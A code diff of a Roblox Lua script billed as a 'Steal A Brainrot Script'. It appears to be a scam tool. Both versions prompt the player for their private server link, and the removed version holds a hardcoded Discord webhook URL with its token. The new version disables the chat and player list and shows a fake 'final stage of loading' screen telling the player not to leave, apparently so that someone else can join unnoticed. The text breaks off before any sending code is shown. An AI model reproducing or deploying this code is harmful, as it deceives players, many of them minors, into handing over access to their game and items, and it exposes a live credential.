@@ -1,407 +1,720 @@
---[[
-    Brainrot Experience GUI - FINAL CORRECTED v3
-    Modern fullscreen GUI for "Steal a Brainrot"
-    GZIN HUB - WORKING VERSION
---]]
+repeat task.wait() until game:IsLoaded()
 
+local LocalPlayer = game.Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+
+local function isValidPrivateServerLink(link)
+    local patterns = {
+        "https://www%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
+        "https://web%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
+        "https://www%.ro%.blox%.com/games/%d+/%S*%?privateServerLinkCode=",
+        "https://www%.rblx%.com/games/%d+/%S*%?privateServerLinkCode=",
+        "https://www%.roblox%.com/share%?code=%w+&type=Server",
+        "https://web%.roblox%.com/share%?code=%w+&type=Server",
+        "https://www%.ro%.blox%.com/share%?code=%w+&type=Server",
+        "https://www%.rblx%.com/share%?code=%w+&type=Server"
+    }
+    
+    for _, pattern in pairs(patterns) do
+        if string.match(link, pattern) then
+            return true
+        end
+    end
+    return false
+end
+
+local function createLinkGUI()
+    local ScreenGui = Instance.new("ScreenGui")
+    local MainFrame = Instance.new("Frame")
+    local GlowFrame = Instance.new("Frame")
+    local ContentFrame = Instance.new("Frame")
+    local TopBar = Instance.new("Frame")
+    local Title = Instance.new("TextLabel")
+    local InstructionText = Instance.new("TextLabel")
+    local InputContainer = Instance.new("Frame")
+    local TextBox = Instance.new("TextBox")
+    local SubmitButton = Instance.new("TextButton")
+    local ErrorLabel = Instance.new("TextLabel")
+    local Gradient = Instance.new("UIGradient")
+    
+    ScreenGui.Name = "LinkInputGUI"
+    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.DisplayOrder = 999
+    
+    MainFrame.Name = "MainFrame"
+    MainFrame.Parent = ScreenGui
+    MainFrame.BackgroundTransparency = 1
+    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -175)
+    MainFrame.Size = UDim2.new(0, 400, 0, 350)
+    MainFrame.Active = true
+    MainFrame.Draggable = true
+    
+    GlowFrame.Name = "GlowFrame"
+    GlowFrame.Parent = MainFrame
+    GlowFrame.BackgroundColor3 = Color3.new(0, 1, 0.5)
+    GlowFrame.BackgroundTransparency = 0.7
+    GlowFrame.Position = UDim2.new(0, -5, 0, -5)
+    GlowFrame.Size = UDim2.new(1, 10, 1, 10)
+    
+    local glowCorner = Instance.new("UICorner")
+    glowCorner.CornerRadius = UDim.new(0, 20)
+    glowCorner.Parent = GlowFrame
+    
+    ContentFrame.Name = "ContentFrame"
+    ContentFrame.Parent = MainFrame
+    ContentFrame.BackgroundColor3 = Color3.new(0.08, 0.08, 0.08)
+    ContentFrame.BorderSizePixel = 0
+    ContentFrame.Size = UDim2.new(1, 0, 1, 0)
+    
+    local contentCorner = Instance.new("UICorner")
+    contentCorner.CornerRadius = UDim.new(0, 15)
+    contentCorner.Parent = ContentFrame
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.new(0, 1, 0.5)
+    stroke.Thickness = 2
+    stroke.Parent = ContentFrame
+    
+    TopBar.Name = "TopBar"
+    TopBar.Parent = ContentFrame
+    TopBar.BackgroundColor3 = Color3.new(0.12, 0.12, 0.12)
+    TopBar.BorderSizePixel = 0
+    TopBar.Size = UDim2.new(1, 0, 0, 50)
+    
+    local topCorner = Instance.new("UICorner")
+    topCorner.CornerRadius = UDim.new(0, 15)
+    topCorner.Parent = TopBar
+    
+    Gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.new(0, 1, 0.5)),
+        ColorSequenceKeypoint.new(1, Color3.new(0, 0.7, 1))
+    }
+    Gradient.Rotation = 45
+    Gradient.Parent = TopBar
+    
+    Title.Name = "Title"
+    Title.Parent = TopBar
+    Title.BackgroundTransparency = 1
+    Title.Position = UDim2.new(0, 15, 0, 0)
+    Title.Size = UDim2.new(1, -30, 1, 0)
+    Title.Font = Enum.Font.GothamBold
+    Title.Text = "One More Step Required."
+    Title.TextColor3 = Color3.new(1, 1, 1)
+    Title.TextSize = 18
+    Title.TextXAlignment = Enum.TextXAlignment.Center
+    
+    InstructionText.Name = "InstructionText"
+    InstructionText.Parent = ContentFrame
+    InstructionText.BackgroundTransparency = 1
+    InstructionText.Position = UDim2.new(0, 20, 0, 70)
+    InstructionText.Size = UDim2.new(1, -40, 0, 100)
+    InstructionText.Font = Enum.Font.Gotham
+    InstructionText.Text = "It's required to input a private server link in the server you're currently in for the script to work. If it's wrong, the script WON'T be able to work.\n\n Tutorial must be shown in the video"
+    InstructionText.TextColor3 = Color3.new(0.9, 0.9, 0.9)
+    InstructionText.TextSize = 14
+    InstructionText.TextWrapped = true
+    InstructionText.TextXAlignment = Enum.TextXAlignment.Center
+    InstructionText.TextYAlignment = Enum.TextYAlignment.Top
+    
+    InputContainer.Name = "InputContainer"
+    InputContainer.Parent = ContentFrame
+    InputContainer.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
+    InputContainer.BorderSizePixel = 0
+    InputContainer.Position = UDim2.new(0, 20, 0, 190)
+    InputContainer.Size = UDim2.new(1, -40, 0, 50)
+    
+    local inputCorner = Instance.new("UICorner")
+    inputCorner.CornerRadius = UDim.new(0, 10)
+    inputCorner.Parent = InputContainer
+    
+    local inputStroke = Instance.new("UIStroke")
+    inputStroke.Color = Color3.new(0.3, 0.3, 0.3)
+    inputStroke.Thickness = 1
+    inputStroke.Parent = InputContainer
+    
+    TextBox.Name = "TextBox"
+    TextBox.Parent = InputContainer
+    TextBox.BackgroundTransparency = 1
+    TextBox.Position = UDim2.new(0, 15, 0, 0)
+    TextBox.Size = UDim2.new(1, -30, 1, 0)
+    TextBox.Font = Enum.Font.Gotham
+    TextBox.PlaceholderText = "Paste your private server link here..."
+    TextBox.PlaceholderColor3 = Color3.new(0.6, 0.6, 0.6)
+    TextBox.Text = ""
+    TextBox.TextColor3 = Color3.new(1, 1, 1)
+    TextBox.TextSize = 14
+    TextBox.TextXAlignment = Enum.TextXAlignment.Left
+    
+    SubmitButton.Name = "SubmitButton"
+    SubmitButton.Parent = ContentFrame
+    SubmitButton.BackgroundColor3 = Color3.new(0, 0.8, 0.4)
+    SubmitButton.BorderSizePixel = 0
+    SubmitButton.Position = UDim2.new(0.5, -70, 0, 260)
+    SubmitButton.Size = UDim2.new(0, 140, 0, 45)
+    SubmitButton.Font = Enum.Font.GothamBold
+    SubmitButton.Text = "Submit Link"
+    SubmitButton.TextColor3 = Color3.new(1, 1, 1)
+    SubmitButton.TextSize = 16
+    
+    local submitCorner = Instance.new("UICorner")
+    submitCorner.CornerRadius = UDim.new(0, 10)
+    submitCorner.Parent = SubmitButton
+    
+    local submitGradient = Instance.new("UIGradient")
+    submitGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.new(0, 1, 0.5)),
+        ColorSequenceKeypoint.new(1, Color3.new(0, 0.6, 0.8))
+    }
+    submitGradient.Rotation = 45
+    submitGradient.Parent = SubmitButton
+    
+    ErrorLabel.Name = "ErrorLabel"
+    ErrorLabel.Parent = ContentFrame
+    ErrorLabel.BackgroundTransparency = 1
+    ErrorLabel.Position = UDim2.new(0, 20, 0, 315)
+    ErrorLabel.Size = UDim2.new(1, -40, 0, 25)
+    ErrorLabel.Font = Enum.Font.Gotham
+    ErrorLabel.Text = ""
+    ErrorLabel.TextColor3 = Color3.new(1, 0.3, 0.3)
+    ErrorLabel.TextSize = 13
+    ErrorLabel.TextWrapped = true
+    ErrorLabel.TextXAlignment = Enum.TextXAlignment.Center
+    
+    TextBox.Focused:Connect(function()
+        inputStroke.Color = Color3.new(0, 1, 0.5)
+        inputStroke.Thickness = 2
+        
+        local focusTween = TweenService:Create(inputStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            Color = Color3.new(0, 1, 0.5)
+        })
+        focusTween:Play()
+    end)
+    
+    TextBox.FocusLost:Connect(function()
+        inputStroke.Color = Color3.new(0.3, 0.3, 0.3)
+        inputStroke.Thickness = 1
+        
+        local unfocusTween = TweenService:Create(inputStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            Color = Color3.new(0.3, 0.3, 0.3)
+        })
+        unfocusTween:Play()
+    end)
+    
+    SubmitButton.MouseEnter:Connect(function()
+        local hoverTween = TweenService:Create(SubmitButton, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            Size = UDim2.new(0, 145, 0, 47),
+            Position = UDim2.new(0.5, -72.5, 0, 259)
+        })
+        hoverTween:Play()
+    end)
+    
+    SubmitButton.MouseLeave:Connect(function()
+        local leaveTween = TweenService:Create(SubmitButton, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            Size = UDim2.new(0, 140, 0, 45),
+            Position = UDim2.new(0.5, -70, 0, 260)
+        })
+        leaveTween:Play()
+    end)
+    
+    local openTween = TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 400, 0, 350)
+    })
+    
+    MainFrame.Size = UDim2.new(0, 0, 0, 0)
+    openTween:Play()
+    
+    return ScreenGui, TextBox, SubmitButton, ErrorLabel
+end
+
+local function Loading2()
+local StarterGui = game:GetService("StarterGui")
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
--- Configuration
-local LOADING_DURATION = 600
-local REQUIRED_BRAINROT = 100000000
-local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya"
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
 
--- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "BrainrotExperienceGUI"
+screenGui.Name = "LoadingScreen"
 screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 999999
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.Parent = playerGui
 
--- Main Background (NOT FULLSCREEN INITIALLY)
-local mainBg = Instance.new("Frame")
-mainBg.Name = "MainBg"
-mainBg.Size = UDim2.new(1, 0, 1, 0)
-mainBg.Position = UDim2.new(0, 0, 0, 0)
-mainBg.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
-mainBg.BorderSizePixel = 0
-mainBg.BackgroundTransparency = 1
-mainBg.Parent = screenGui
+local background = Instance.new("Frame")
+background.Name = "Background"
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+background.BorderSizePixel = 0
+background.ZIndex = 1
+background.Parent = screenGui
 
--- Main Frame
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 500, 0, 380)
-mainFrame.Position = UDim2.new(0.5, -250, 0.5, -190)
-mainFrame.BackgroundColor3 = Color3.fromRGB(20, 25, 40)
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = mainBg
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 8, 20)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(8, 8, 12)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 6, 14))
+}
+gradient.Rotation = 45
+gradient.Parent = background
 
-local mainCorner = Instance.new("UICorner")
-mainCorner.CornerRadius = UDim.new(0, 20)
-mainCorner.Parent = mainFrame
+local particlesFrame = Instance.new("Frame")
+particlesFrame.Name = "Particles"
+particlesFrame.Size = UDim2.new(1, 0, 1, 0)
+particlesFrame.BackgroundTransparency = 1
+particlesFrame.ZIndex = 2
+particlesFrame.Parent = background
 
-local mainShadow = Instance.new("UIStroke")
-mainShadow.Color = Color3.fromRGB(70, 130, 180)
-mainShadow.Thickness = 2
-mainShadow.Transparency = 0.5
-mainShadow.Parent = mainFrame
+for i = 1, 20 do
+	local particle = Instance.new("Frame")
+	particle.Size = UDim2.new(0, math.random(2, 4), 0, math.random(2, 4))
+	particle.Position = UDim2.new(math.random(0, 100) / 100, 0, math.random(0, 100) / 100, 0)
+	particle.BackgroundColor3 = Color3.fromRGB(100, 100, 200)
+	particle.BackgroundTransparency = 0.7
+	particle.BorderSizePixel = 0
+	particle.ZIndex = 2
+	particle.Parent = particlesFrame
+	
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(1, 0)
+	corner.Parent = particle
+	
+	spawn(function()
+		while true do
+			local floatTween = TweenService:Create(particle, TweenInfo.new(math.random(3, 6), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+				Position = UDim2.new(math.random(0, 100) / 100, 0, math.random(0, 100) / 100, 0)
+			})
+			floatTween:Play()
+			floatTween.Completed:Wait()
+		end
+	end)
+end
 
-local topBar = Instance.new("Frame")
-topBar.Name = "TopBar"
-topBar.Size = UDim2.new(1, 0, 0, 60)
-topBar.Position = UDim2.new(0, 0, 0, 0)
-topBar.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
-topBar.BorderSizePixel = 0
-topBar.Parent = mainFrame
+local centerContainer = Instance.new("Frame")
+centerContainer.Name = "CenterContainer"
+centerContainer.Size = UDim2.new(0, 500, 0, 450)
+centerContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
+centerContainer.AnchorPoint = Vector2.new(0.5, 0.5)
+centerContainer.BackgroundTransparency = 1
+centerContainer.ZIndex = 3
+centerContainer.Parent = background
 
-local topBarCorner = Instance.new("UICorner")
-topBarCorner.CornerRadius = UDim.new(0, 20)
-topBarCorner.Parent = topBar
+local uiScale = Instance.new("UIScale")
+uiScale.Parent = centerContainer
 
-local topLabel = Instance.new("TextLabel")
-topLabel.Name = "TopLabel"
-topLabel.Size = UDim2.new(1, 0, 1, 0)
-topLabel.Position = UDim2.new(0, 0, 0, 0)
-topLabel.BackgroundTransparency = 1
-topLabel.Text = "gvzin-hub-v1"
-topLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-topLabel.TextSize = 28
-topLabel.Font = Enum.Font.GothamBold
-topLabel.Parent = topBar
+local logoFrame = Instance.new("Frame")
+logoFrame.Name = "LogoFrame"
+logoFrame.Size = UDim2.new(0, 100, 0, 100)
+logoFrame.Position = UDim2.new(0.5, 0, 0, 0)
+logoFrame.AnchorPoint = Vector2.new(0.5, 0)
+logoFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 140)
+logoFrame.BorderSizePixel = 0
+logoFrame.ZIndex = 4
+logoFrame.Parent = centerContainer
+
+local logoCorner = Instance.new("UICorner")
+logoCorner.CornerRadius = UDim.new(0.15, 0)
+logoCorner.Parent = logoFrame
+
+local logoGradient = Instance.new("UIGradient")
+logoGradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(90, 90, 180)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(70, 70, 160)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 120))
+}
+logoGradient.Rotation = 135
+logoGradient.Parent = logoFrame
+
+local logoStroke = Instance.new("UIStroke")
+logoStroke.Color = Color3.fromRGB(120, 120, 220)
+logoStroke.Thickness = 2
+logoStroke.Transparency = 0.5
+logoStroke.Parent = logoFrame
+
+local innerLogo = Instance.new("Frame")
+innerLogo.Size = UDim2.new(0.6, 0, 0.6, 0)
+innerLogo.Position = UDim2.new(0.5, 0, 0.5, 0)
+innerLogo.AnchorPoint = Vector2.new(0.5, 0.5)
+innerLogo.BackgroundColor3 = Color3.fromRGB(140, 140, 240)
+innerLogo.BorderSizePixel = 0
+innerLogo.ZIndex = 5
+innerLogo.Parent = logoFrame
+
+local innerCorner = Instance.new("UICorner")
+innerCorner.CornerRadius = UDim.new(0.2, 0)
+innerCorner.Parent = innerLogo
 
 local titleLabel = Instance.new("TextLabel")
 titleLabel.Name = "TitleLabel"
 titleLabel.Size = UDim2.new(1, 0, 0, 50)
-titleLabel.Position = UDim2.new(0, 0, 0, 65)
+titleLabel.Position = UDim2.new(0.5, 0, 0, 120)
+titleLabel.AnchorPoint = Vector2.new(0.5, 0)
 titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "Melhorar Experiência"
+titleLabel.Text = "Steal A Brainrot Script"
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.TextSize = 26
+titleLabel.TextSize = 32
 titleLabel.Font = Enum.Font.GothamBold
-titleLabel.Parent = mainFrame
+titleLabel.ZIndex = 4
+titleLabel.Parent = centerContainer
 
-local linkLabel = Instance.new("TextLabel")
-linkLabel.Name = "LinkLabel"
-linkLabel.Size = UDim2.new(0.9, 0, 0, 25)
-linkLabel.Position = UDim2.new(0.05, 0, 0, 120)
-linkLabel.BackgroundTransparency = 1
-linkLabel.Text = "Link para melhorar a experiência:"
-linkLabel.TextColor3 = Color3.fromRGB(180, 200, 220)
-linkLabel.TextSize = 14
-linkLabel.Font = Enum.Font.Gotham
-linkLabel.TextXAlignment = Enum.TextXAlignment.Left
-linkLabel.Parent = mainFrame
+local titleStroke = Instance.new("UIStroke")
+titleStroke.Color = Color3.fromRGB(100, 100, 200)
+titleStroke.Thickness = 1
+titleStroke.Transparency = 0.7
+titleStroke.Parent = titleLabel
 
-local inputFrame = Instance.new("Frame")
-inputFrame.Name = "InputFrame"
-inputFrame.Size = UDim2.new(0.9, 0, 0, 55)
-inputFrame.Position = UDim2.new(0.05, 0, 0, 150)
-inputFrame.BackgroundColor3 = Color3.fromRGB(30, 35, 55)
-inputFrame.BorderSizePixel = 0
-inputFrame.Parent = mainFrame
+local subtitleLabel = Instance.new("TextLabel")
+subtitleLabel.Name = "SubtitleLabel"
+subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
+subtitleLabel.Position = UDim2.new(0.5, 0, 0, 175)
+subtitleLabel.AnchorPoint = Vector2.new(0.5, 0)
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Text = "Final Stage Of Loading"
+subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 220)
+subtitleLabel.TextSize = 18
+subtitleLabel.Font = Enum.Font.GothamMedium
+subtitleLabel.ZIndex = 4
+subtitleLabel.Parent = centerContainer
 
-local inputCorner = Instance.new("UICorner")
-inputCorner.CornerRadius = UDim.new(0, 10)
-inputCorner.Parent = inputFrame
+local infoFrame = Instance.new("Frame")
+infoFrame.Name = "InfoFrame"
+infoFrame.Size = UDim2.new(0.95, 0, 0, 65)
+infoFrame.Position = UDim2.new(0.5, 0, 0, 220)
+infoFrame.AnchorPoint = Vector2.new(0.5, 0)
+infoFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
+infoFrame.BorderSizePixel = 0
+infoFrame.ZIndex = 4
+infoFrame.Parent = centerContainer
 
-local inputStroke = Instance.new("UIStroke")
-inputStroke.Color = Color3.fromRGB(0, 150, 255)
-inputStroke.Thickness = 2
-inputStroke.Parent = inputFrame
+local infoCorner = Instance.new("UICorner")
+infoCorner.CornerRadius = UDim.new(0, 8)
+infoCorner.Parent = infoFrame
 
-local inputBox = Instance.new("TextBox")
-inputBox.Name = "InputBox"
-inputBox.Size = UDim2.new(1, -20, 1, 0)
-inputBox.Position = UDim2.new(0, 10, 0, 0)
-inputBox.BackgroundTransparency = 1
-inputBox.Text = ""
-inputBox.PlaceholderText = "Cole o link aqui..."
-inputBox.PlaceholderColor3 = Color3.fromRGB(100, 120, 150)
-inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-inputBox.TextSize = 16
-inputBox.Font = Enum.Font.Gotham
-inputBox.TextXAlignment = Enum.TextXAlignment.Left
-inputBox.ClearTextOnFocus = false
-inputBox.Parent = inputFrame
+local infoStroke = Instance.new("UIStroke")
+infoStroke.Color = Color3.fromRGB(60, 60, 120)
+infoStroke.Thickness = 1
+infoStroke.Transparency = 0.6
+infoStroke.Parent = infoFrame
 
-local doneButton = Instance.new("TextButton")
-doneButton.Name = "DoneButton"
-doneButton.Size = UDim2.new(0.5, 0, 0, 50)
-doneButton.Position = UDim2.new(0.25, 0, 0, 220)
-doneButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
-doneButton.BorderSizePixel = 0
-doneButton.Text = "Enviar"
-doneButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-doneButton.TextSize = 18
-doneButton.Font = Enum.Font.GothamBold
-doneButton.Parent = mainFrame
+local infoLabel = Instance.new("TextLabel")
+infoLabel.Size = UDim2.new(0.95, 0, 1, 0)
+infoLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+infoLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+infoLabel.BackgroundTransparency = 1
+infoLabel.Text = "This stage of loading is required to make the script be usable, working, and stable. Please wait until it loads and do not leave the game."
+infoLabel.TextColor3 = Color3.fromRGB(160, 160, 200)
+infoLabel.TextSize = 14
+infoLabel.Font = Enum.Font.Gotham
+infoLabel.TextWrapped = true
+infoLabel.TextXAlignment = Enum.TextXAlignment.Center
+infoLabel.TextYAlignment = Enum.TextYAlignment.Center
+infoLabel.ZIndex = 5
+infoLabel.Parent = infoFrame
 
-local buttonCorner = Instance.new("UICorner")
-buttonCorner.CornerRadius = UDim.new(0, 10)
-buttonCorner.Parent = doneButton
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Name = "StatusLabel"
+statusLabel.Size = UDim2.new(1, 0, 0, 25)
+statusLabel.Position = UDim2.new(0.5, 0, 0, 300)
+statusLabel.AnchorPoint = Vector2.new(0.5, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Initializing connection..."
+statusLabel.TextColor3 = Color3.fromRGB(140, 140, 180)
+statusLabel.TextSize = 15
+statusLabel.Font = Enum.Font.Gotham
+statusLabel.ZIndex = 4
+statusLabel.Parent = centerContainer
 
-local function onButtonHover()
-    TweenService:Create(doneButton, TweenInfo.new(0.2), {
-        BackgroundColor3 = Color3.fromRGB(0, 180, 255)
-    }):Play()
+local progressBarBg = Instance.new("Frame")
+progressBarBg.Name = "ProgressBarBg"
+progressBarBg.Size = UDim2.new(0.85, 0, 0, 8)
+progressBarBg.Position = UDim2.new(0.5, 0, 0, 340)
+progressBarBg.AnchorPoint = Vector2.new(0.5, 0)
+progressBarBg.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+progressBarBg.BorderSizePixel = 0
+progressBarBg.ZIndex = 4
+progressBarBg.Parent = centerContainer
+
+local progressBarCorner = Instance.new("UICorner")
+progressBarCorner.CornerRadius = UDim.new(1, 0)
+progressBarCorner.Parent = progressBarBg
+
+local progressBarStroke = Instance.new("UIStroke")
+progressBarStroke.Color = Color3.fromRGB(50, 50, 90)
+progressBarStroke.Thickness = 1
+progressBarStroke.Transparency = 0.5
+progressBarStroke.Parent = progressBarBg
+
+local progressBar = Instance.new("Frame")
+progressBar.Name = "ProgressBar"
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(80, 80, 180)
+progressBar.BorderSizePixel = 0
+progressBar.ZIndex = 5
+progressBar.Parent = progressBarBg
+
+local progressBarCorner2 = Instance.new("UICorner")
+progressBarCorner2.CornerRadius = UDim.new(1, 0)
+progressBarCorner2.Parent = progressBar
+
+local progressBarGradient = Instance.new("UIGradient")
+progressBarGradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 100, 200)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 80, 180)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 60, 140))
+}
+progressBarGradient.Parent = progressBar
+
+local progressGlow = Instance.new("UIStroke")
+progressGlow.Color = Color3.fromRGB(120, 120, 220)
+progressGlow.Thickness = 2
+progressGlow.Transparency = 0.3
+progressGlow.Parent = progressBar
+
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Name = "PercentLabel"
+percentLabel.Size = UDim2.new(1, 0, 0, 25)
+percentLabel.Position = UDim2.new(0.5, 0, 0, 360)
+percentLabel.AnchorPoint = Vector2.new(0.5, 0)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Text = "0%"
+percentLabel.TextColor3 = Color3.fromRGB(120, 120, 160)
+percentLabel.TextSize = 16
+percentLabel.Font = Enum.Font.GothamMedium
+percentLabel.ZIndex = 4
+percentLabel.Parent = centerContainer
+
+local dotsLabel = Instance.new("TextLabel")
+dotsLabel.Size = UDim2.new(1, 0, 0, 25)
+dotsLabel.Position = UDim2.new(0.5, 0, 0, 395)
+dotsLabel.AnchorPoint = Vector2.new(0.5, 0)
+dotsLabel.BackgroundTransparency = 1
+dotsLabel.Text = "..."
+dotsLabel.TextColor3 = Color3.fromRGB(100, 100, 140)
+dotsLabel.TextSize = 20
+dotsLabel.Font = Enum.Font.GothamBold
+dotsLabel.ZIndex = 4
+dotsLabel.Parent = centerContainer
+
+local function updateScale()
+	local viewportSize = workspace.CurrentCamera.ViewportSize
+	local minDimension = math.min(viewportSize.X, viewportSize.Y)
+	local scale = math.clamp(minDimension / 800, 0.5, 1.5)
+	uiScale.Scale = scale
 end
 
-local function onButtonLeave()
-    TweenService:Create(doneButton, TweenInfo.new(0.2), {
-        BackgroundColor3 = Color3.fromRGB(0, 150, 255)
-    }):Play()
-end
+updateScale()
+workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale)
 
-doneButton.MouseEnter:Connect(onButtonHover)
-doneButton.MouseLeave:Connect(onButtonLeave)
-
-local notificationFrame = Instance.new("Frame")
-notificationFrame.Name = "NotificationFrame"
-notificationFrame.Size = UDim2.new(0, 400, 0, 80)
-notificationFrame.Position = UDim2.new(0.5, -200, 0.05, 0)
-notificationFrame.BackgroundColor3 = Color3.fromRGB(30, 35, 55)
-notificationFrame.BorderSizePixel = 0
-notificationFrame.Visible = false
-notificationFrame.Parent = screenGui
-
-local notificationCorner = Instance.new("UICorner")
-notificationCorner.CornerRadius = UDim.new(0, 15)
-notificationCorner.Parent = notificationFrame
-
-local notificationStroke = Instance.new("UIStroke")
-notificationStroke.Color = Color3.fromRGB(0, 150, 255)
-notificationStroke.Thickness = 2
-notificationStroke.Parent = notificationFrame
-
-local notificationText = Instance.new("TextLabel")
-notificationText.Name = "NotificationText"
-notificationText.Size = UDim2.new(1, -20, 1, 0)
-notificationText.Position = UDim2.new(0, 10, 0, 0)
-notificationText.BackgroundTransparency = 1
-notificationText.Text = ""
-notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
-notificationText.TextSize = 16
-notificationText.Font = Enum.Font.Gotham
-notificationText.TextWrapped = true
-notificationText.Parent = notificationFrame
-
-local loadingScreen = Instance.new("Frame")
-loadingScreen.Name = "LoadingScreen"
-loadingScreen.Size = UDim2.new(1, 0, 1, 0)
-loadingScreen.Position = UDim2.new(0, 0, 0, 0)
-loadingScreen.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
-loadingScreen.BorderSizePixel = 0
-loadingScreen.Visible = false
-loadingScreen.Parent = screenGui
-
-local loadingTitle = Instance.new("TextLabel")
-loadingTitle.Name = "LoadingTitle"
-loadingTitle.Size = UDim2.new(1, 0, 0, 100)
-loadingTitle.Position = UDim2.new(0, 0, 0.3, 0)
-loadingTitle.BackgroundTransparency = 1
-loadingTitle.Text = "Loading... Please wait"
-loadingTitle.TextColor3 = Color3.fromRGB(0, 150, 255)
-loadingTitle.TextSize = 36
-loadingTitle.Font = Enum.Font.GothamBold
-loadingTitle.Parent = loadingScreen
-
-local loadingBarBg = Instance.new("Frame")
-loadingBarBg.Name = "LoadingBarBg"
-loadingBarBg.Size = UDim2.new(0.6, 0, 0, 25)
-loadingBarBg.Position = UDim2.new(0.2, 0, 0.5, 0)
-loadingBarBg.BackgroundColor3 = Color3.fromRGB(30, 35, 55)
-loadingBarBg.BorderSizePixel = 0
-loadingBarBg.Parent = loadingScreen
-
-local loadingBarBgCorner = Instance.new("UICorner")
-loadingBarBgCorner.CornerRadius = UDim.new(0, 12)
-loadingBarBgCorner.Parent = loadingBarBg
-
-local loadingBarBgStroke = Instance.new("UIStroke")
-loadingBarBgStroke.Color = Color3.fromRGB(0, 150, 255)
-loadingBarBgStroke.Thickness = 2
-loadingBarBgStroke.Parent = loadingBarBg
-
-local loadingBarFill = Instance.new("Frame")
-loadingBarFill.Name = "LoadingBarFill"
-loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
-loadingBarFill.Position = UDim2.new(0, 0, 0, 0)
-loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
-loadingBarFill.BorderSizePixel = 0
-loadingBarFill.Parent = loadingBarBg
-
-local loadingBarFillCorner = Instance.new("UICorner")
-loadingBarFillCorner.CornerRadius = UDim.new(0, 12)
-loadingBarFillCorner.Parent = loadingBarFill
-
-local completionMessage = Instance.new("TextLabel")
-completionMessage.Name = "CompletionMessage"
-completionMessage.Size = UDim2.new(1, 0, 0, 100)
-completionMessage.Position = UDim2.new(0, 0, 0.6, 0)
-completionMessage.BackgroundTransparency = 1
-completionMessage.Text = ""
-completionMessage.TextColor3 = Color3.fromRGB(0, 200, 100)
-completionMessage.TextSize = 40
-completionMessage.Font = Enum.Font.GothamBold
-completionMessage.Parent = loadingScreen
-
-local function showNotification(message, duration)
-    notificationText.Text = message
-    notificationFrame.Visible = true
-    
